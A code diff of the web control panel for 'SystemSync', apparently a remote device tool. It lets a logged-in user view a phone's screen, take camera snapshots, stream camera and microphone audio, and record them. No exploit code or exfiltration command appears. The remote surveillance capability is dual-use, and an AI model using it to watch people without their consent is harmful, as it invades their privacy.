+            !e.target.closest('#sidebarCloseBtn') && e.target.tagName === 'BUTTON') {
+            closeSidebar();
+        }
+    });
+
+
+
+    // Firebase initialization
     firebase.initializeApp(CONFIG.FIREBASE_CONFIG);
     const auth = firebase.auth();
     const db = firebase.firestore();
 
+    // Global variables
     let currentUser = null;
     let selectedDeviceId = null;
     let ws = null;
@@ -766,220 +794,1222 @@
     let recordedChunks = [];
     let pendingCommand = null;
     let newAlerts = [];
+    let appsData = [];
     let screenMediaRecorder = null;
     let screenRecordedChunks = [];
 
+    // DOM elements
     const panel = document.getElementById('main-panel');
     const statusEl = document.getElementById('status');
     const wsDebug = document.getElementById('wsDebug');
     const modalOverlay = document.getElementById('screenModalOverlay');
     const modalVideo = document.getElementById('modalScreenVideo');
+    const modalSnapBtn = document.getElementById('modalSnapBtn');
+    const modalRecordBtn = document.getElementById('modalRecordBtn');
+    const modalFullscreenBtn = document.getElementById('modalFullscreenBtn');
+    const modalCloseBtn = document.getElementById('modalCloseBtn');
 
-    function getFormattedDateTime() { const d = new Date(); return `${d.getDate()}-${d.getMonth()+1}-${d.getFullYear()}-${d.getHours()}-${d.getMinutes()}-${d.getSeconds()}`; }
-    function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, function(m) { if (m === '&') return '&amp;'; if (m === '<') return '&lt;'; if (m === '>') return '&gt;'; return m; }); }
-    function formatBytes(b) { if (b === 0) return '0 B'; const k = 1024; const i = Math.floor(Math.log(b)/Math.log(k)); return (b/Math.pow(k,i)).toFixed(1) + ' ' + ['B','KB','MB','GB'][i]; }
-    function setStatus(s) { statusEl.innerText = s; if (s === 'ONLINE') { statusEl.classList.remove('offline'); statusEl.style.background = '#e8f5e9'; statusEl.style.color = '#2e7d32'; } else { statusEl.classList.add('offline'); statusEl.style.background = '#ffebee'; statusEl.style.color = '#c62828'; } }
-    function showNotification(text) { const orig = statusEl.innerText; statusEl.innerText = text; setTimeout(() => { statusEl.innerText = orig; }, 2000); }
-    function pushAlert(title, body) { newAlerts.unshift({ title, body, time: new Date().toLocaleTimeString() }); if (newAlerts.length > 50) newAlerts.pop(); const badge = document.getElementById('alertsBadge'); const list = document.getElementById('alertsList'); if (!badge) return; badge.style.display = 'block'; list.innerHTML = ''; newAlerts.forEach(a => { const d = document.createElement('div'); d.style.cssText = 'margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px'; d.textContent = a.time + ' ' + a.title + ': ' + a.body; list.appendChild(d); }); }
-    function clearAlerts() { newAlerts.length = 0; const badge = document.getElementById('alertsBadge'); if (badge) badge.style.display = 'none'; }
+    // ==================== HELPER FUNCTIONS ====================
+    function getFormattedDateTime() {
+        const d = new Date();
+        const pad = (n) => n.toString().padStart(2, '0');
+        return `${pad(d.getDate())}-${pad(d.getMonth()+1)}-${d.getFullYear()}-${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
+    }
 
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    function formatBytes(b) {
+        if (b === 0) return '0 B';
+        const k = 1024, sizes = ['B','KB','MB','GB'];
+        const i = Math.floor(Math.log(b)/Math.log(k));
+        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
+    }
+
+    function showNotification(text) {
+        const orig = statusEl.innerText;
+        statusEl.innerText = text;
+        setTimeout(() => { statusEl.innerText = orig; }, 2000);
+    }
+
+    function setStatus(s) {
+        statusEl.innerText = s;
+        if (s === 'ONLINE') {
+            statusEl.classList.remove('offline');
+            statusEl.style.background = '#e8f5e9';
+            statusEl.style.color = '#2e7d32';
+        } else {
+            statusEl.classList.add('offline');
+            statusEl.style.background = '#ffebee';
+            statusEl.style.color = '#c62828';
+        }
+    }
+
+    function pushAlert(title, body) {
+        newAlerts.unshift({ title: title, body: body, time: new Date().toLocaleTimeString() });
+        if (newAlerts.length > 50) newAlerts.pop();
+        const badge = document.getElementById('alertsBadge');
+        const list = document.getElementById('alertsList');
+        if (!badge || !list) return;
+        badge.style.display = 'block';
+        list.innerHTML = '';
+        newAlerts.forEach(function(a) {
+            const d = document.createElement('div');
+            d.style.cssText = 'margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px';
+            d.textContent = a.time + ' ' + a.title + ': ' + a.body;
+            list.appendChild(d);
+        });
+    }
+
+    function clearAlerts() {
+        newAlerts.length = 0;
+        const badge = document.getElementById('alertsBadge');
+        if (badge) badge.style.display = 'none';
+    }
+
+    // ==================== AUTHENTICATION ====================
     function renderAuthForm() {
         const container = document.getElementById('authBox');
         if (isLoginMode) {
-            container.innerHTML = `<h2>🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display: none;" /><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div><div id="authError"></div>`;
+            container.innerHTML = `
+                <h2>🔐 SystemSync Login</h2>
+                <input type="email" id="authEmail" placeholder="Email" />
+                <input type="password" id="authPassword" placeholder="Password" />
+                <input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display: none;" />
+                <button id="authBtn">Sign In</button>
+                <div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div>
+                <div id="authError"></div>
+            `;
         } else {
-            container.innerHTML = `<h2>📝 Create Account</h2><input type="email" id="authEmail" placeholder="Email" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" /><button id="authBtn">Sign Up</button><div class="toggle-link" id="toggleAuthMode">Already have an account? Sign in</div><div id="authError"></div>`;
+            container.innerHTML = `
+                <h2>📝 Create Account</h2>
+                <input type="email" id="authEmail" placeholder="Email" />
+                <input type="password" id="authPassword" placeholder="Password" />
+                <input type="password" id="authConfirmPassword" placeholder="Confirm Password" />
+                <button id="authBtn">Sign Up</button>
+                <div class="toggle-link" id="toggleAuthMode">Already have an account? Sign in</div>
+                <div id="authError"></div>
+            `;
         }
         document.getElementById('authBtn').addEventListener('click', handleAuth);
-        document.getElementById('toggleAuthMode').addEventListener('click', () => { isLoginMode = !isLoginMode; renderAuthForm(); });
+        document.getElementById('toggleAuthMode').addEventListener('click', toggleAuthMode);
     }
 
-    async function handleAuth() {
+    function toggleAuthMode() {
+        isLoginMode = !isLoginMode;
+        renderAuthForm();
+    }
+
+    function handleAuth() {
         const email = document.getElementById('authEmail').value.trim();
         const password = document.getElementById('authPassword').value.trim();
         const errorDiv = document.getElementById('authError');
         errorDiv.innerText = '';
-        if (!email || !password) { errorDiv.innerText = 'Please fill all fields'; return; }
-        try {
-            if (!isLoginMode) {
-                const confirm = document.getElementById('authConfirmPassword').value.trim();
-                if (password !== confirm) { errorDiv.innerText = 'Passwords do not match'; return; }
-                const userCredential = await auth.createUserWithEmailAndPassword(email, password);
-                currentUser = userCredential.user;
-            } else {
-                const userCredential = await auth.signInWithEmailAndPassword(email, password);
-                currentUser = userCredential.user;
+
+        if (!email || !password) {
+            errorDiv.innerText = 'Please fill all fields';
+            return;
+        }
+
+        if (!isLoginMode) {
+            const confirm = document.getElementById('authConfirmPassword').value.trim();
+            if (password !== confirm) {
+                errorDiv.innerText = 'Passwords do not match';
+                return;
             }
-            document.getElementById('authContainer').style.display = 'none';
-            document.getElementById('deviceListContainer').style.display = 'flex';
-            loadDevices();
-        } catch (error) {
-            let msg = error.message;
-            if (msg.includes('auth/email-already-in-use')) msg = 'Email already registered. Please sign in.';
-            if (msg.includes('auth/user-not-found')) msg = 'No account found. Sign up first.';
-            if (msg.includes('auth/wrong-password')) msg = 'Wrong password.';
-            errorDiv.innerText = msg;
+            auth.createUserWithEmailAndPassword(email, password)
+                .then(userCredential => {
+                    currentUser = userCredential.user;
+                    document.getElementById('authContainer').style.display = 'none';
+                    document.getElementById('deviceListContainer').style.display = 'flex';
+                    loadDevices();
+                })
+                .catch(error => {
+                    errorDiv.innerText = error.message;
+                });
+        } else {
+            auth.signInWithEmailAndPassword(email, password)
+                .then(userCredential => {
+                    currentUser = userCredential.user;
+                    document.getElementById('authContainer').style.display = 'none';
+                    document.getElementById('deviceListContainer').style.display = 'flex';
+                    loadDevices();
+                })
+                .catch(error => {
+                    errorDiv.innerText = error.message;
+                });
         }
     }
 
-    function logout() { auth.signOut().then(() => { document.getElementById('deviceListContainer').style.display = 'none'; document.getElementById('sidebar').style.display = 'none'; document.getElementById('main').style.display = 'none'; document.getElementById('authContainer').style.display = 'flex'; if (ws) ws.close(); selectedDeviceId = null; isLoginMode = true; renderAuthForm(); }); }
+    function logout() {
+        auth.signOut().then(() => {
+            document.getElementById('deviceListContainer').style.display = 'none';
+            document.getElementById('sidebar').style.display = 'none';
+            document.getElementById('main').style.display = 'none';
+            document.getElementById('authContainer').style.display = 'flex';
+            if (ws) ws.close();
+            selectedDeviceId = null;
+            isLoginMode = true;
+            renderAuthForm();
+        });
+    }
 
-    async function loadDevices() {
+    function loadDevices() {
         if (!currentUser) return;
-        try {
-            const snapshot = await db.collection('devices').where('userId', '==', currentUser.uid).get();
-            const deviceList = document.getElementById('deviceList');
-            deviceList.innerHTML = '';
-            if (snapshot.empty) {
-                deviceList.innerHTML = '<p style="color:#999; text-align:center;">No devices registered.</p>';
-            } else {
-                snapshot.forEach(doc => {
-                    const device = doc.data();
-                    const div = document.createElement('div');
-                    div.className = 'device-item';
-                    div.onclick = () => selectDevice(device.deviceId, device.name || 'Unknown');
-                    div.innerHTML = `<span class="device-icon">📱</span><div class="device-info"><div class="device-name">${escapeHtml(device.name || 'Unnamed device')}</div><div class="device-id">${escapeHtml(device.deviceId)}</div></div>`;
-                    deviceList.appendChild(div);
-                });
-            }
-        } catch (error) { console.error(error); alert('Failed to load devices: ' + error.message); }
+        db.collection('devices').where('userId', '==', currentUser.uid).get()
+            .then(snapshot => {
+                const deviceList = document.getElementById('deviceList');
+                deviceList.innerHTML = '';
+                if (snapshot.empty) {
+                    deviceList.innerHTML = '<p style="color:#999; text-align:center;">No devices registered.</p>';
+                } else {
+                    snapshot.forEach(doc => {
+                        const device = doc.data();
+                        const div = document.createElement('div');
+                        div.className = 'device-item';
+                        div.onclick = () => selectDevice(device.deviceId, device.name || 'Unknown');
+                        div.innerHTML = `
+                            <span class="device-icon">📱</span>
+                            <div class="device-info">
+                                <div class="device-name">${escapeHtml(device.name || 'Unnamed device')}</div>
+                                <div class="device-id">${escapeHtml(device.deviceId)}</div>
+                            </div>
+                        `;
+                        deviceList.appendChild(div);
+                    });
+                }
+                document.getElementById('deviceListContainer').style.display = 'flex';
+            })
+            .catch(error => {
+                console.error('Error loading devices:', error);
+                alert('Failed to load devices: ' + error.message);
+            });
     }
 
     function selectDevice(deviceId, deviceName) {
         selectedDeviceId = deviceId;
         document.getElementById('deviceListContainer').style.display = 'none';
-        document.getElementById('sidebar').style.display = 'block';
+        // Show main interface (sidebar visibility handled by CSS media queries)
+        document.getElementById('sidebar').style.display = '';
+        document.getElementById('sidebar').style.removeProperty('display');
         document.getElementById('main').style.display = 'flex';
+        // On desktop the sidebar CSS shows it; on mobile it starts hidden (off-canvas)
         document.getElementById('serverInfo').innerText = `Device: ${deviceName || deviceId}`;
         connectWebSocket();
     }
 
+    // ==================== WEBSOCKET MODULE ====================
     function connectWebSocket() {
-        if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
-        if (reconnectTimer) clearTimeout(reconnectTimer);
+        if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
+            console.log('already connecting/open');
+            return;
+        }
+        if (reconnectTimer) {
+            clearTimeout(reconnectTimer);
+            reconnectTimer = null;
+        }
         setStatus('CONNECTING');
         if (wsDebug) wsDebug.innerText = '🌐 WebSocket: connecting...';
         panel.innerHTML = '⏳ Connecting to server...';
+
         ws = new WebSocket(CONFIG.WS_URL);
-        ws.onopen = () => { reconnectAttempts = 0; ws.send('I_AM_WEB'); setStatus('ONLINE'); panel.innerHTML = '✅ Connected to server. Ready.'; if (wsDebug) wsDebug.innerText = '🌐 WebSocket: ONLINE'; };
+        ws.onopen = () => {
+            console.log('WebSocket connected');
+            reconnectAttempts = 0;
+            ws.send('I_AM_WEB');
+            setStatus('ONLINE');
+            panel.innerHTML = '✅ Connected to server. Ready.';
+            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: ONLINE';
+        };
         ws.onmessage = (e) => handleIncomingMessage(e.data);
-        ws.onclose = () => { setStatus('OFFLINE'); wsDebug.innerText = '🌐 WebSocket: closed'; panel.innerHTML = '🔌 WebSocket disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.'; ws = null; const delay = Math.min(1000 * Math.pow(1.5, reconnectAttempts), CONFIG.MAX_RECONNECT_DELAY); reconnectAttempts++; reconnectTimer = setTimeout(() => connectWebSocket(), delay); };
-        ws.onerror = () => { setStatus('ERROR'); wsDebug.innerText = '🌐 WebSocket: error'; };
+        ws.onclose = (ev) => {
+            console.log('WebSocket closed', ev.reason);
+            setStatus('OFFLINE');
+            if (wsDebug) wsDebug.innerText = `🌐 WebSocket: closed (${ev.reason})`;
+            panel.innerHTML = '🔌 WebSocket disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.';
+            ws = null;
+            const delay = Math.min(1000 * Math.pow(1.5, reconnectAttempts), CONFIG.MAX_RECONNECT_DELAY);
+            reconnectAttempts++;
+            if (reconnectTimer) clearTimeout(reconnectTimer);
+            reconnectTimer = setTimeout(() => {
+                console.log('Reconnecting...');
+                connectWebSocket();
+            }, delay);
+        };
+        ws.onerror = (err) => {
+            console.error('WebSocket error:', err);
+            setStatus('ERROR');
+            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: error';
+        };
     }
-    window.manualReconnect = function() { if (reconnectTimer) clearTimeout(reconnectTimer); if (ws) ws.close(); reconnectAttempts = 0; connectWebSocket(); };
+
+    function manualReconnect() {
+        if (reconnectTimer) {
+            clearTimeout(reconnectTimer);
+            reconnectTimer = null;
+        }
+        if (ws) {
+            ws.close();
+            ws = null;
+        }
+        reconnectAttempts = 0;
+        connectWebSocket();
+    }
 
     function sendCommand(command, params = {}) {
-        if (!ws || ws.readyState !== WebSocket.OPEN) { panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>`; return; }
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>`;
+            return;
+        }
         const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
-        const payload = { type: 'COMMAND', command, requestId, params, deviceId: selectedDeviceId, timestamp: Date.now() };
+        const payload = {
+            type: 'COMMAND',
+            command: command,
+            requestId: requestId,
+            params: params,
+            deviceId: selectedDeviceId,
+            timestamp: Date.now()
+        };
         ws.send(JSON.stringify(payload));
         panel.innerHTML = `<div style="color:#1976ff;">📤 Command sent: ${command}</div>`;
         pendingCommand = command;
+        console.log('Sent command:', command, params);
         setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
     }
-    function sendPlainText(msg) { if (!ws || ws.readyState !== WebSocket.OPEN) return; ws.send(msg); panel.innerHTML = `<div style="color:#1976ff;">📤 Plain text sent: ${msg}</div>`; }
 
+    function sendPlainText(msg) {
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected.</div>`;
+            return;
+        }
+        ws.send(msg);
+        panel.innerHTML = `<div style="color:#1976ff;">📤 Plain text sent: ${msg}</div>`;
+    }
+
+    // ==================== WEBRTC MODULE ====================
     function createPeerConnection(streamType, onTrackCallback, useMic = false) {
         const pc = new RTCPeerConnection({ iceServers: CONFIG.ICE_SERVERS });
-        if (streamType === 'screen') pc.addTransceiver('video', { direction: 'recvonly' });
-        else if (streamType === 'camera') { pc.addTransceiver('video', { direction: 'recvonly' }); if (useMic) pc.addTransceiver('audio', { direction: 'recvonly' }); }
-        else if (streamType === 'audio') pc.addTransceiver('audio', { direction: 'recvonly' });
+        if (streamType === 'screen') {
+            pc.addTransceiver('video', { direction: 'recvonly' });
+        } else if (streamType === 'camera') {
+            pc.addTransceiver('video', { direction: 'recvonly' });
+            if (useMic) pc.addTransceiver('audio', { direction: 'recvonly' });
+        } else if (streamType === 'audio') {
+            pc.addTransceiver('audio', { direction: 'recvonly' });
+        }
         pc.ontrack = onTrackCallback;
-        pc.onicecandidate = (e) => { if (e.candidate) sendSignalingMessage({ type: 'ICE_CANDIDATE', candidate: e.candidate, streamType }); };
+        pc.onicecandidate = (e) => {
+            if (e.candidate) sendSignalingMessage({ type: 'ICE_CANDIDATE', candidate: e.candidate, streamType: streamType });
+        };
+        pc.oniceconnectionstatechange = () => {
+            if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
+                if (streamType === 'screen') {
+                    screenActive = false;
+                    document.getElementById('screenBtn').innerText = 'Start Screen';
+                    closeScreenModal();
+                }
+            }
+        };
         return pc;
     }
-    function getPCForType(type) { if (type === 'screen') return screenPC; if (type === 'camera') return cameraPC; if (type === 'audio') return audioPC; return null; }
-    function sendSignalingMessage(msg) { if (!ws || ws.readyState !== WebSocket.OPEN) return; ws.send(JSON.stringify({ type: 'SIGNALING', deviceId: selectedDeviceId, data: msg })); }
-    function handleSignalingMessage(msg) {
-        if (msg.type === 'ANSWER') { const pc = getPCForType(msg.streamType); if (pc) pc.setRemoteDescription(new RTCSessionDescription({ type: 'answer', sdp: msg.sdp })); }
-        else if (msg.type === 'ICE_CANDIDATE') { const pc = getPCForType(msg.streamType); if (pc && msg.candidate) pc.addIceCandidate(new RTCIceCandidate(msg.candidate)); }
+
+    function getPCForType(type) {
+        if (type === 'screen') return screenPC;
+        if (type === 'camera') return cameraPC;
+        if (type === 'audio') return audioPC;
+        return null;
     }
 
-    function openScreenModal() { modalOverlay.classList.add('show'); document.body.classList.add('modal-open'); if (screenMediaRecorder && screenMediaRecorder.state === 'recording') screenMediaRecorder.stop(); screenMediaRecorder = null; screenRecordedChunks = []; document.getElementById('modalRecordBtn').innerText = '🔴'; }
-    function closeScreenModal() { if (screenMediaRecorder && screenMediaRecorder.state === 'recording') screenMediaRecorder.stop(); modalOverlay.classList.remove('show'); document.body.classList.remove('modal-open'); if (screenActive) toggleScreen(); }
+    function sendSignalingMessage(msg) {
+        if (!ws || ws.readyState !== WebSocket.OPEN) return;
+        const payload = { type: 'SIGNALING', deviceId: selectedDeviceId, data: msg };
+        ws.send(JSON.stringify(payload));
+    }
+
+    function handleSignalingMessage(msg) {
+        if (msg.type === 'ANSWER') {
+            const pc = getPCForType(msg.streamType);
+            if (pc) pc.setRemoteDescription(new RTCSessionDescription({ type: 'answer', sdp: msg.sdp }));
+        } else if (msg.type === 'ICE_CANDIDATE') {
+            const pc = getPCForType(msg.streamType);
+            if (pc && msg.candidate) pc.addIceCandidate(new RTCIceCandidate(msg.candidate));
+        }
+    }
+
+    function openScreenModal() {
+        modalOverlay.classList.add('show');
+        document.body.classList.add('modal-open');
+        modalRecordBtn.innerText = '🔴';
+        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') screenMediaRecorder.stop();
+        screenMediaRecorder = null;
+        screenRecordedChunks = [];
+    }
+
+    function closeScreenModal() {
+        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') screenMediaRecorder.stop();
+        modalOverlay.classList.remove('show');
+        document.body.classList.remove('modal-open');
+        if (screenActive) toggleScreen();
+        modalRecordBtn.innerText = '🔴';
+    }
+
     async function toggleScreen() {
         if (screenActive) {
-            if (screenPC) screenPC.close(); screenPC = null; document.getElementById('screenBtn').innerText = 'Start Screen'; screenActive = false; closeScreenModal(); sendSignalingMessage({ type: 'STOP_SCREEN' });
+            if (screenPC) screenPC.close();
+            screenPC = null;
+            document.getElementById('screenBtn').innerText = 'Start Screen';
+            screenActive = false;
+            closeScreenModal();
+            sendSignalingMessage({ type: 'STOP_SCREEN' });
         } else {
-            openScreenModal(); modalVideo.srcObject = null;
+            openScreenModal();
+            modalVideo.srcObject = null;
             screenPC = createPeerConnection('screen', (e) => { modalVideo.srcObject = e.streams[0]; });
-            const offer = await screenPC.createOffer(); await screenPC.setLocalDescription(offer); sendSignalingMessage({ type: 'OFFER', sdp: offer.sdp, streamType: 'screen' });
-            document.getElementById('screenBtn').innerText = 'Stop Screen'; screenActive = true;
+            try {
+                const offer = await screenPC.createOffer();
+                await screenPC.setLocalDescription(offer);
+                sendSignalingMessage({ type: 'OFFER', sdp: offer.sdp, streamType: 'screen' });
+                document.getElementById('screenBtn').innerText = 'Stop Screen';
+                screenActive = true;
+            } catch (e) {
+                showNotification('Failed: ' + e.message);
+                screenPC = null;
+                closeScreenModal();
+            }
         }
     }
-    document.getElementById('modalSnapBtn').addEventListener('click', () => { if (!modalVideo || !modalVideo.videoWidth) return alert('No active screen share'); const canvas = document.createElement('canvas'); canvas.width = modalVideo.videoWidth; canvas.height = modalVideo.videoHeight; canvas.getContext('2d').drawImage(modalVideo, 0, 0); canvas.toBlob(blob => { const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.download = `screenImage-${getFormattedDateTime()}.png`; a.href = url; a.click(); URL.revokeObjectURL(url); }); });
-    document.getElementById('modalRecordBtn').addEventListener('click', () => { if (!modalVideo.srcObject) return alert('Phone Screen Off'); if (screenMediaRecorder && screenMediaRecorder.state === 'recording') { screenMediaRecorder.stop(); document.getElementById('modalRecordBtn').innerText = '🔴'; } else { screenRecordedChunks = []; const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d'); const originalStream = modalVideo.srcObject; const startRec = () => { canvas.width = modalVideo.videoWidth; canvas.height = modalVideo.videoHeight; function drawFrame() { ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height); requestAnimationFrame(drawFrame); } drawFrame(); const canvasStream = canvas.captureStream(30); originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track)); screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' }); screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data); screenMediaRecorder.onstop = () => { const blob = new Blob(screenRecordedChunks, { type: 'video/webm' }); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.download = `screenVideo-${getFormattedDateTime()}.webm`; a.href = url; a.click(); URL.revokeObjectURL(url); canvasStream.getTracks().forEach(track => track.stop()); }; screenMediaRecorder.start(); document.getElementById('modalRecordBtn').innerText = '🟢'; }; if (modalVideo.videoWidth === 0) modalVideo.onloadedmetadata = startRec; else startRec(); } });
-    document.getElementById('modalFullscreenBtn').addEventListener('click', () => { if (!document.fullscreenElement) modalVideo.requestFullscreen(); else document.exitFullscreen(); });
-    document.getElementById('modalCloseBtn').addEventListener('click', closeScreenModal);
 
-    function capturePicture() { const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value; const useFlash = document.getElementById('clickFlashCheckbox').checked; sendCommand('CAMERA_SNAPSHOT', { camera, flash: useFlash }); }
-    function displayCapturedImage(base64) { panel.innerHTML = `<img src="data:image/jpeg;base64,${base64}"><div><button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')">💾 SAVE IMAGE</button></div>`; }
-    function downloadBase64(b64, filename) { const a = document.createElement('a'); a.href = 'data:application/octet-stream;base64,' + b64; a.download = filename; a.click(); }
+    function snapScreenFromModal() {
+        if (!modalVideo || !modalVideo.videoWidth) return alert('No active screen share');
+        const canvas = document.createElement('canvas');
+        canvas.width = modalVideo.videoWidth;
+        canvas.height = modalVideo.videoHeight;
+        canvas.getContext('2d').drawImage(modalVideo, 0, 0);
+        canvas.toBlob(blob => {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.download = `screenImage-${getFormattedDateTime()}.png`;
+            a.href = url;
+            a.click();
+            URL.revokeObjectURL(url);
+        });
+    }
 
+    function toggleScreenRecording() {
+        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+            screenMediaRecorder.stop();
+            modalRecordBtn.innerText = '🔴';
+        } else {
+            if (!modalVideo.srcObject) return alert('Phone Screen Off');
+            screenRecordedChunks = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const stream = modalVideo.srcObject;
+            if (modalVideo.videoWidth === 0) modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
+            else startScreenRecording(canvas, ctx, stream);
+        }
+    }
+
+    function startScreenRecording(canvas, ctx, originalStream) {
+        canvas.width = modalVideo.videoWidth;
+        canvas.height = modalVideo.videoHeight;
+        function drawFrame() { ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height); requestAnimationFrame(drawFrame); }
+        drawFrame();
+        const canvasStream = canvas.captureStream(30);
+        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
+        screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
+        screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
+        screenMediaRecorder.onstop = () => {
+            const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.download = `screenVideo-${getFormattedDateTime()}.webm`;
+            a.href = url;
+            a.click();
+            URL.revokeObjectURL(url);
+            canvasStream.getTracks().forEach(track => track.stop());
+        };
+        screenMediaRecorder.start();
+        modalRecordBtn.innerText = '🟢';
+    }
+
+    function toggleFullscreen() {
+        if (!document.fullscreenElement) modalVideo.requestFullscreen().catch(console.error);
+        else document.exitFullscreen();
+    }
+
+    modalSnapBtn.addEventListener('click', snapScreenFromModal);
+    modalRecordBtn.addEventListener('click', toggleScreenRecording);
+    modalFullscreenBtn.addEventListener('click', toggleFullscreen);
+    modalCloseBtn.addEventListener('click', closeScreenModal);
+
+    async function startLiveStream() {
+        const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
+        const useFlash = document.getElementById('liveFlashCheckbox').checked;
+        const useMic = document.getElementById('liveMicCheckbox').checked;
+        panel.innerHTML = `<div><video id="liveCamVideo" autoplay playsinline style="width:100%; max-height:500px; background:#000;"></video><div class="live-controls"><button onclick="takeSnapshot()" id="snapshotBtn">📸 Snapshot</button><button onclick="toggleRecording()" id="recordBtn">🔴 Record</button><button class="stop" onclick="stopLiveStream()">⏹ Stop</button></div></div>`;
+        cameraPC = createPeerConnection('camera', (e) => { document.getElementById('liveCamVideo').srcObject = e.streams[0]; }, useMic);
+        try {
+            const offer = await cameraPC.createOffer();
+            await cameraPC.setLocalDescription(offer);
+            sendSignalingMessage({ type: 'OFFER', sdp: offer.sdp, streamType: 'camera', camera: camera, flash: useFlash, mic: useMic });
+        } catch (e) { showNotification('Failed to start camera stream'); cameraPC = null; panel.innerHTML = 'Ready.'; }
+    }
+
+    function stopLiveStream() {
+        if (cameraPC) { cameraPC.close(); cameraPC = null; }
+        sendSignalingMessage({ type: 'STOP_CAMERA' });
+        panel.innerHTML = 'Ready.';
+    }
+
+    async function toggleLiveAudio() {
+        if (audioPC) stopLiveAudio();
+        else startLiveAudio();
+    }
+
+    async function startLiveAudio() {
+        panel.innerHTML = '<div style="text-align:center;">Live audio streaming...<br><audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio></div>';
+        audioPC = createPeerConnection('audio', (e) => { document.getElementById('liveAudio').srcObject = e.streams[0]; }, true);
+        try {
+            const offer = await audioPC.createOffer();
+            await audioPC.setLocalDescription(offer);
+            sendSignalingMessage({ type: 'OFFER', sdp: offer.sdp, streamType: 'audio', mic: true });
+            document.getElementById('liveAudioBtn').parentElement.style.display = 'none';
+            document.getElementById('stopLiveAudioBtn').style.display = 'block';
+        } catch (e) { showNotification('Failed to start audio stream'); audioPC = null; panel.innerHTML = 'Ready.'; }
+    }
+
+    function stopLiveAudio() {
+        if (audioPC) { audioPC.close(); audioPC = null; }
+        sendSignalingMessage({ type: 'STOP_AUDIO' });
+        document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
+        document.getElementById('stopLiveAudioBtn').style.display = 'none';
+        panel.innerHTML = 'Ready.';
+    }
+
+    function takeSnapshot() {
+        const video = document.getElementById('liveCamVideo');
+        if (!video || !video.videoWidth) return alert('No live video');
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.download = `snapshot_${Date.now()}.png`;
+            a.href = url;
+            a.click();
+            URL.revokeObjectURL(url);
+        });
+    }
+
+    function toggleRecording() {
+        const video = document.getElementById('liveCamVideo');
+        if (!video || !video.srcObject) return alert('No live stream');
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+            document.getElementById('recordBtn').innerText = 'Record Video';
+        } else {
+            recordedChunks = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const stream = video.srcObject;
+            if (video.videoWidth === 0) video.onloadedmetadata = () => startCanvasRecording(video, canvas, ctx, stream);
+            else startCanvasRecording(video, canvas, ctx, stream);
+        }
+    }
+
+    function startCanvasRecording(video, canvas, ctx, originalStream) {
+        canvas.width = video.videoHeight;
+        canvas.height = video.videoWidth;
+        function drawFrame() {
+            ctx.save();
+            ctx.translate(canvas.width/2, canvas.height/2);
+            ctx.rotate(90 * Math.PI / 180);
